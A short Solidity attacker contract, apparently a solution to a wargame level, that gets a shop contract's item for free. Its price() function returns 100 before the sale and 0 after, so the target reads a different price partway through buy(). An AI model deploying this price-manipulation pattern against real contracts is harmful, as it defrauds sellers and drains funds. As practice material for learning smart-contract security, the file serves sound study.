// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract ShopAttacker {
    IShop public shop;

    constructor(address shopAddress) {
        shop = IShop(shopAddress);
    }

    function attack() external {
        shop.buy();
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 0 : 100;
    }
}
